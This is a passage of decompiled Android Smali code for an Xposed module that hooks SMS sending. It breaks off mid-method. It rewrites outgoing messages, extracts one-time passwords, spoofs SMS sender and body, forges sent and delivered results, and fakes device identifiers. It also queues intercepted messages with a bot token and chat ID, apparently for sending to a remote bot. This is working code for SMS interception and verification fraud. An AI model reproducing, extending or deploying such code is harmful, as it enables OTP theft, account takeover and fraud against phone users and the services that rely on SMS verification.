.class public Lcom/rebel/module/XposedHook;
.super Ljava/lang/Object;
.source "XposedHook.java"

# interfaces
.implements Lde/robv/android/xposed/IXposedHookLoadPackage;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/rebel/module/XposedHook$Callback;
    }
.end annotation


# static fields
.field private static final BATCH_DELAY_MS:J = 0x3e8L

.field private static final SPOOF_EXPIRY_MS:J = 0x1d4c0L

.field private static volatile lastExtractedOtp:Ljava/lang/String;

.field private static volatile spoofBody:Ljava/lang/String;

.field private static volatile spoofSender:Ljava/lang/String;

.field private static volatile spoofTimestamp:J


# instance fields
.field private batchBotToken:Ljava/lang/String;

.field private batchChatId:Ljava/lang/String;

.field private final batchEntries:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "[",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private batchHandler:Landroid/os/Handler;

.field private final batchLogIds:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Ljava/lang/Long;",
            ">;"
        }
    .end annotation
.end field

.field private batchRunnable:Ljava/lang/Runnable;

.field private configManager:Lcom/rebel/module/ConfigManager;

.field private context:Landroid/content/Context;

.field private database:Lcom/rebel/module/SmsLogDatabase;

.field private injectFileObserver:Landroid/os/FileObserver;

.field private isSystemServer:Z

.field private volatile lastSmsDestNumber:Ljava/lang/String;


# direct methods
.method static bridge synthetic -$$Nest$fgetconfigManager(Lcom/rebel/module/XposedHook;)Lcom/rebel/module/ConfigManager;
    .locals 0

    iget-object p0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$mclearSpoof(Lcom/rebel/module/XposedHook;)V
    .locals 0

    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->clearSpoof()V

    return-void
.end method

.method static bridge synthetic -$$Nest$mgetActiveSpoofBody(Lcom/rebel/module/XposedHook;Ljava/lang/String;)Ljava/lang/String;
    .locals 0

    invoke-direct {p0, p1}, Lcom/rebel/module/XposedHook;->getActiveSpoofBody(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method static bridge synthetic -$$Nest$mgetActiveSpoofSender(Lcom/rebel/module/XposedHook;)Ljava/lang/String;
    .locals 0

    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->getActiveSpoofSender()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method static bridge synthetic -$$Nest$mhandleInterceptedSms(Lcom/rebel/module/XposedHook;Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;Z)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/rebel/module/XposedHook;->handleInterceptedSms(Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;Z)V

    return-void
.end method

.method static bridge synthetic -$$Nest$misSpoofActive(Lcom/rebel/module/XposedHook;)Z
    .locals 0

    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->isSpoofActive()Z

    move-result p0

    return p0
.end method

.method static bridge synthetic -$$Nest$mshouldSpoofGmsSender(Lcom/rebel/module/XposedHook;)Z
    .locals 0

    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->shouldSpoofGmsSender()Z

    move-result p0

    return p0
.end method

.method static bridge synthetic -$$Nest$mspoofGsfCursor(Lcom/rebel/module/XposedHook;Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/rebel/module/XposedHook;->spoofGsfCursor(Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;Lcom/rebel/module/DeviceFakerManager$DeviceProfile;)V

    return-void
.end method

.method static constructor <clinit>()V
    .locals 3

    .line 51
    const/4 v0, 0x0

    sput-object v0, Lcom/rebel/module/XposedHook;->spoofBody:Ljava/lang/String;

    .line 52
    sput-object v0, Lcom/rebel/module/XposedHook;->spoofSender:Ljava/lang/String;

    .line 53
    const-wide/16 v1, 0x0

    sput-wide v1, Lcom/rebel/module/XposedHook;->spoofTimestamp:J

    .line 62
    sput-object v0, Lcom/rebel/module/XposedHook;->lastExtractedOtp:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 27
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 34
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/rebel/module/XposedHook;->batchEntries:Ljava/util/List;

    .line 35
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/rebel/module/XposedHook;->batchLogIds:Ljava/util/List;

    .line 38
    const-string v0, ""

    iput-object v0, p0, Lcom/rebel/module/XposedHook;->batchBotToken:Ljava/lang/String;

    .line 39
    iput-object v0, p0, Lcom/rebel/module/XposedHook;->batchChatId:Ljava/lang/String;

    .line 48
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/rebel/module/XposedHook;->isSystemServer:Z

    .line 101
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/rebel/module/XposedHook;->lastSmsDestNumber:Ljava/lang/String;

    return-void
.end method

.method private declared-synchronized addToBatch(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;J)V
    .locals 4
    .param p1, "botToken"    # Ljava/lang/String;
    .param p2, "chatId"    # Ljava/lang/String;
    .param p3, "destNumber"    # Ljava/lang/String;
    .param p4, "message"    # Ljava/lang/String;
    .param p5, "logId"    # J

    monitor-enter p0

    .line 1044
    :try_start_0
    iput-object p1, p0, Lcom/rebel/module/XposedHook;->batchBotToken:Ljava/lang/String;

    .line 1045
    iput-object p2, p0, Lcom/rebel/module/XposedHook;->batchChatId:Ljava/lang/String;

    .line 1046
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->batchEntries:Ljava/util/List;

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    aput-object p3, v1, v2

    const/4 v2, 0x1

    aput-object p4, v1, v2

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 1047
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->batchLogIds:Ljava/util/List;

    invoke-static {p5, p6}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 1052
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->batchHandler:Landroid/os/Handler;

    if-nez v0, :cond_0

    .line 1053
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lcom/rebel/module/XposedHook;->batchHandler:Landroid/os/Handler;

    .line 1055
    .end local p0    # "this":Lcom/rebel/module/XposedHook;
    :cond_0
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->batchRunnable:Ljava/lang/Runnable;

    if-eqz v0, :cond_1

    .line 1056
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->batchHandler:Landroid/os/Handler;

    iget-object v1, p0, Lcom/rebel/module/XposedHook;->batchRunnable:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 1058
    :cond_1
    new-instance v0, Lcom/rebel/module/XposedHook$$ExternalSyntheticLambda0;

    invoke-direct {v0, p0}, Lcom/rebel/module/XposedHook$$ExternalSyntheticLambda0;-><init>(Lcom/rebel/module/XposedHook;)V

    iput-object v0, p0, Lcom/rebel/module/XposedHook;->batchRunnable:Ljava/lang/Runnable;

    .line 1059
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->batchHandler:Landroid/os/Handler;

    iget-object v1, p0, Lcom/rebel/module/XposedHook;->batchRunnable:Ljava/lang/Runnable;

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 1060
    monitor-exit p0

    return-void

    .line 1043
    .end local p1    # "botToken":Ljava/lang/String;
    .end local p2    # "chatId":Ljava/lang/String;
    .end local p3    # "destNumber":Ljava/lang/String;
    .end local p4    # "message":Ljava/lang/String;
    .end local p5    # "logId":J
    :catchall_0
    move-exception p1

    :try_start_1
    monitor-exit p0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    throw p1
.end method

.method private clearSpoof()V
    .locals 3

    .line 853
    sget-object v0, Lcom/rebel/module/XposedHook;->spoofBody:Ljava/lang/String;

    if-eqz v0, :cond_0

    .line 854
    sget-object v0, Lcom/rebel/module/XposedHook;->spoofSender:Ljava/lang/String;

    .line 855
    .local v0, "oldSender":Ljava/lang/String;
    sget-object v1, Lcom/rebel/module/XposedHook;->spoofBody:Ljava/lang/String;

    .line 856
    .local v1, "oldBody":Ljava/lang/String;
    const/4 v2, 0x0

    sput-object v2, Lcom/rebel/module/XposedHook;->spoofBody:Ljava/lang/String;

    .line 857
    sput-object v2, Lcom/rebel/module/XposedHook;->spoofSender:Ljava/lang/String;

    .line 864
    .end local v0    # "oldSender":Ljava/lang/String;
    .end local v1    # "oldBody":Ljava/lang/String;
    :cond_0
    :try_start_0
    invoke-static {}, Lcom/rebel/module/NativeBridge;->nativeClearSpoof()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 866
    goto :goto_0

    .line 865
    :catchall_0
    move-exception v0

    .line 867
    :goto_0
    return-void
.end method

.method private detectCallingApp()Ljava/lang/String;
    .locals 3

    .line 72
    :try_start_0
    invoke-static {}, Landroid/os/Binder;->getCallingUid()I

    move-result v0

    .line 73
    .local v0, "callingUid":I
    iget-object v1, p0, Lcom/rebel/module/XposedHook;->context:Landroid/content/Context;

    if-eqz v1, :cond_0

    .line 74
    iget-object v1, p0, Lcom/rebel/module/XposedHook;->context:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/content/pm/PackageManager;->getPackagesForUid(I)[Ljava/lang/String;

    move-result-object v1

    .line 75
    .local v1, "packages":[Ljava/lang/String;
    if-eqz v1, :cond_0

    array-length v2, v1

    if-lez v2, :cond_0

    .line 76
    const/4 v2, 0x0

    aget-object v2, v1, v2

    return-object v2

    .line 79
    .end local v1    # "packages":[Ljava/lang/String;
    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "uid:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v1

    .line 80
    .end local v0    # "callingUid":I
    :catch_0
    move-exception v0

    .line 81
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "unknown"

    return-object v1
.end method

.method private extractOtp(Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "body"    # Ljava/lang/String;

    .line 795
    const/4 v0, 0x0

    if-eqz p1, :cond_2

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_0

    goto :goto_0

    .line 797
    :cond_0
    invoke-static {p1}, Lcom/rebel/module/NativeBridge;->extractOtp(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 798
    .local v1, "otp":Ljava/lang/String;
    if-eqz v1, :cond_1

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_1

    move-object v0, v1

    :cond_1
    return-object v0

    .line 796
    .end local v1    # "otp":Ljava/lang/String;
    :cond_2
    :goto_0
    return-object v0
.end method

.method private fireDirectSmsBroadcast(Ljava/lang/String;I)V
    .locals 10
    .param p1, "destNumber"    # Ljava/lang/String;
    .param p2, "resultCode"    # I

    .line 945
    const-string v1, "SMS_SENT"

    :try_start_0
    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->getApplicationContext()Landroid/content/Context;

    move-result-object v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_6

    move-object v2, v0

    .line 946
    .local v2, "context":Landroid/content/Context;
    if-nez v2, :cond_0

    .line 949
    return-void

    .line 954
    :cond_0
    :try_start_1
    new-instance v3, Landroid/content/Intent;

    invoke-direct {v3, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 955
    .local v3, "sentIntent":Landroid/content/Intent;
    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    move v7, p2

    .end local p2    # "resultCode":I
    .local v7, "resultCode":I
    :try_start_2
    invoke-virtual/range {v2 .. v9}, Landroid/content/Context;->sendOrderedBroadcast(Landroid/content/Intent;Ljava/lang/String;Landroid/content/BroadcastReceiver;Landroid/os/Handler;ILjava/lang/String;Landroid/os/Bundle;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 961
    .end local v3    # "sentIntent":Landroid/content/Intent;
    goto :goto_0

    .line 958
    :catchall_0
    move-exception v0

    goto :goto_0

    .end local v7    # "resultCode":I
    .restart local p2    # "resultCode":I
    :catchall_1
    move-exception v0

    move v7, p2

    .line 964
    .end local p2    # "resultCode":I
    .restart local v7    # "resultCode":I
    :goto_0
    if-eqz p1, :cond_1

    :try_start_3
    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result p2
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_4

    if-nez p2, :cond_1

    .line 966
    :try_start_4
    new-instance v3, Landroid/content/Intent;

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-direct {v3, p2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 967
    .local v3, "sentNumIntent":Landroid/content/Intent;
    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v2 .. v9}, Landroid/content/Context;->sendOrderedBroadcast(Landroid/content/Intent;Ljava/lang/String;Landroid/content/BroadcastReceiver;Landroid/os/Handler;ILjava/lang/String;Landroid/os/Bundle;)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    .line 974
    .end local v3    # "sentNumIntent":Landroid/content/Intent;
    goto :goto_1

    .line 971
    :catchall_2
    move-exception v0

    .line 978
    :goto_1
    :try_start_5
    new-instance v3, Landroid/content/Intent;

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "SMS_DELIVERY"

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-direct {v3, p2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 979
    .local v3, "deliveryIntent":Landroid/content/Intent;
    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v2 .. v9}, Landroid/content/Context;->sendOrderedBroadcast(Landroid/content/Intent;Ljava/lang/String;Landroid/content/BroadcastReceiver;Landroid/os/Handler;ILjava/lang/String;Landroid/os/Bundle;)V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_3

    .line 987
    .end local v3    # "deliveryIntent":Landroid/content/Intent;
    goto :goto_2

    .line 984
    :catchall_3
    move-exception v0

    goto :goto_2

    .line 1001
    .end local v2    # "context":Landroid/content/Context;
    :catchall_4
    move-exception v0

    goto :goto_4

    .line 992
    .restart local v2    # "context":Landroid/content/Context;
    :cond_1
    :goto_2
    :try_start_6
    new-instance v3, Landroid/content/Intent;

    const-string p2, "SMS_DELIVERED"

    invoke-direct {v3, p2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 993
    .local v3, "deliveredIntent":Landroid/content/Intent;
    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v2 .. v9}, Landroid/content/Context;->sendOrderedBroadcast(Landroid/content/Intent;Ljava/lang/String;Landroid/content/BroadcastReceiver;Landroid/os/Handler;ILjava/lang/String;Landroid/os/Bundle;)V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_5

    .line 999
    .end local v3    # "deliveredIntent":Landroid/content/Intent;
    goto :goto_3

    .line 996
    :catchall_5
    move-exception v0

    .line 1004
    .end local v2    # "context":Landroid/content/Context;
    :goto_3
    goto :goto_4

    .line 1001
    .end local v7    # "resultCode":I
    .restart local p2    # "resultCode":I
    :catchall_6
    move-exception v0

    move v7, p2

    .line 1005
    .end local p2    # "resultCode":I
    .restart local v7    # "resultCode":I
    :goto_4
    return-void
.end method

.method private firePendingIntentWithResultCode(Landroid/app/PendingIntent;ILjava/lang/String;)V
    .locals 2
    .param p1, "intent"    # Landroid/app/PendingIntent;
    .param p2, "resultCode"    # I
    .param p3, "type"    # Ljava/lang/String;

    .line 907
    if-nez p1, :cond_0

    .line 908
    return-void

    .line 912
    :cond_0
    :try_start_0
    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 913
    .local v0, "ctx":Landroid/content/Context;
    const/4 v1, 0x0

    invoke-virtual {p1, v0, p2, v1}, Landroid/app/PendingIntent;->send(Landroid/content/Context;ILandroid/content/Intent;)V
    :try_end_0
    .catch Landroid/app/PendingIntent$CanceledException; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .end local v0    # "ctx":Landroid/content/Context;
    goto :goto_0

    .line 920
    :catchall_0
    move-exception v0

    .line 928
    .local v0, "e":Ljava/lang/Throwable;
    :try_start_1
    invoke-virtual {p1, p2}, Landroid/app/PendingIntent;->send(I)V
    :try_end_1
    .catch Landroid/app/PendingIntent$CanceledException; {:try_start_1 .. :try_end_1} :catch_0

    .line 934
    goto :goto_1

    .line 931
    :catch_0
    move-exception v1

    goto :goto_1

    .line 917
    .end local v0    # "e":Ljava/lang/Throwable;
    :catch_1
    move-exception v0

    .line 935
    :goto_0
    nop

    .line 936
    :goto_1
    return-void
.end method

.method private getActiveSpoofBody()Ljava/lang/String;
    .locals 1

    .line 749
    const/4 v0, 0x0

    invoke-direct {p0, v0}, Lcom/rebel/module/XposedHook;->getActiveSpoofBody(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private getActiveSpoofBody(Ljava/lang/String;)Ljava/lang/String;
    .locals 4
    .param p1, "originalBody"    # Ljava/lang/String;

    .line 754
    sget-object v0, Lcom/rebel/module/XposedHook;->spoofBody:Ljava/lang/String;

    if-eqz v0, :cond_0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sget-wide v2, Lcom/rebel/module/XposedHook;->spoofTimestamp:J

    sub-long/2addr v0, v2

    const-wide/32 v2, 0x1d4c0

    cmp-long v0, v0, v2

    if-gez v0, :cond_0

    .line 755
    sget-object v0, Lcom/rebel/module/XposedHook;->spoofBody:Ljava/lang/String;

    invoke-direct {p0, v0, p1}, Lcom/rebel/module/XposedHook;->resolveOtpPlaceholder(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0

    .line 758
    :cond_0
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    if-eqz v0, :cond_1

    .line 759
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->c0xb8e4c6a9()Ljava/lang/String;

    move-result-object v0

    .line 760
    .local v0, "configBody":Ljava/lang/String;
    if-eqz v0, :cond_1

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_1

    .line 761
    invoke-direct {p0, v0, p1}, Lcom/rebel/module/XposedHook;->resolveOtpPlaceholder(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    return-object v1

    .line 764
    .end local v0    # "configBody":Ljava/lang/String;
    :cond_1
    const/4 v0, 0x0

    return-object v0
.end method

.method private getActiveSpoofSender()Ljava/lang/String;
    .locals 4

    .line 838
    sget-object v0, Lcom/rebel/module/XposedHook;->spoofSender:Ljava/lang/String;

    if-eqz v0, :cond_0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sget-wide v2, Lcom/rebel/module/XposedHook;->spoofTimestamp:J

    sub-long/2addr v0, v2

    const-wide/32 v2, 0x1d4c0

    cmp-long v0, v0, v2

    if-gez v0, :cond_0

    .line 839
    sget-object v0, Lcom/rebel/module/XposedHook;->spoofSender:Ljava/lang/String;

    return-object v0

    .line 842
    :cond_0
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    if-eqz v0, :cond_1

    .line 843
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->c0xa3f1d7e2()Ljava/lang/String;

    move-result-object v0

    .line 844
    .local v0, "senderId":Ljava/lang/String;
    if-eqz v0, :cond_1

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_1

    .line 845
    return-object v0

    .line 848
    .end local v0    # "senderId":Ljava/lang/String;
    :cond_1
    const/4 v0, 0x0

    return-object v0
.end method

.method private getApplicationContext()Landroid/content/Context;
    .locals 3

    .line 886
    :try_start_0
    const-string v0, "android.app.ActivityThread"

    .line 887
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    const-string v1, "currentApplication"

    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Object;

    .line 886
    invoke-static {v0, v1, v2}, Lde/robv/android/xposed/XposedHelpers;->callStaticMethod(Ljava/lang/Class;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/Context;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    return-object v0

    .line 888
    :catchall_0
    move-exception v0

    .line 891
    .local v0, "e":Ljava/lang/Throwable;
    const/4 v1, 0x0

    return-object v1
.end method

.method private getInjectCmdFile()Ljava/lang/String;
    .locals 2

    .line 43
    const-string v0, "inject_cmd_file"

    invoke-static {v0}, Lcom/rebel/module/NativeBridge;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 44
    .local v0, "path":Ljava/lang/String;
    if-eqz v0, :cond_0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    move-object v1, v0

    goto :goto_0

    :cond_0
    const-string v1, "/data/local/tmp/src_sms_inject.json"

    :goto_0
    return-object v1
.end method

.method private getLastOtpFile()Ljava/lang/String;
    .locals 2

    .line 58
    const-string v0, "last_otp_file"

    invoke-static {v0}, Lcom/rebel/module/NativeBridge;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 59
    .local v0, "path":Ljava/lang/String;
    if-eqz v0, :cond_0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    move-object v1, v0

    goto :goto_0

    :cond_0
    const-string v1, "/data/local/tmp/src_last_otp.txt"

    :goto_0
    return-object v1
.end method

.method private handleInterceptedSms(Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;Z)V
    .locals 22
    .param p1, "param"    # Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;
    .param p2, "isMultipart"    # Z

    .line 143
    move-object/from16 v1, p0

    move-object/from16 v12, p1

    :try_start_0
    iget-object v0, v1, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->isSmsHooking2Enabled()Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_7

    const/4 v2, 0x0

    const-string v3, "YESSRCD"

    const-string v4, "YESPROD"

    const/4 v5, 0x2

    if-eqz v0, :cond_1

    .line 144
    :try_start_1
    iget-object v0, v12, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    aget-object v0, v0, v2

    check-cast v0, Ljava/lang/String;

    .line 145
    .local v0, "destNumber":Ljava/lang/String;
    iget-object v2, v12, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    aget-object v2, v2, v5

    check-cast v2, Ljava/lang/String;

    .line 146
    .local v2, "message":Ljava/lang/String;
    if-eqz v2, :cond_0

    invoke-virtual {v2, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_0

    .line 147
    iget-object v6, v12, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    invoke-virtual {v2, v4, v3}, Ljava/lang/String;->replaceFirst(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v6, v5

    .line 148
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "SmsHook2 (Client): Mutated YESPROD to YESSRCD for: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 152
    :cond_0
    return-void

    .line 155
    .end local v0    # "destNumber":Ljava/lang/String;
    .end local v2    # "message":Ljava/lang/String;
    :cond_1
    iget-object v0, v1, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->isHookSmsEnabled()Z

    move-result v0

    if-nez v0, :cond_2

    .line 158
    return-void

    .line 161
    :cond_2
    iget-object v0, v12, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    aget-object v0, v0, v2

    check-cast v0, Ljava/lang/String;

    move-object v7, v0

    .line 162
    .local v7, "destNumber":Ljava/lang/String;
    iget-object v0, v12, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    aget-object v0, v0, v5

    check-cast v0, Ljava/lang/String;

    move-object v2, v0

    .line 163
    .restart local v2    # "message":Ljava/lang/String;
    iget-object v0, v12, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    const/4 v6, 0x3

    aget-object v0, v0, v6

    check-cast v0, Landroid/app/PendingIntent;

    move-object v13, v0

    .line 164
    .local v13, "sentIntent":Landroid/app/PendingIntent;
    iget-object v0, v12, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    const/4 v6, 0x4

    aget-object v0, v0, v6

    move-object v8, v0

    check-cast v8, Landroid/app/PendingIntent;

    move-object v14, v8

    .line 168
    .local v14, "deliveryIntent":Landroid/app/PendingIntent;
    if-eqz v2, :cond_3

    invoke-virtual {v2, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_7

    if-eqz v0, :cond_3

    .line 169
    return-void

    .line 174
    :cond_3
    const-string v6, "SRC_"

    if-eqz v2, :cond_4

    :try_start_2
    invoke-virtual {v2, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 175
    return-void

    .line 179
    :cond_4
    invoke-direct {v1}, Lcom/rebel/module/XposedHook;->detectCallingApp()Ljava/lang/String;

    move-result-object v9

    move-object v15, v9

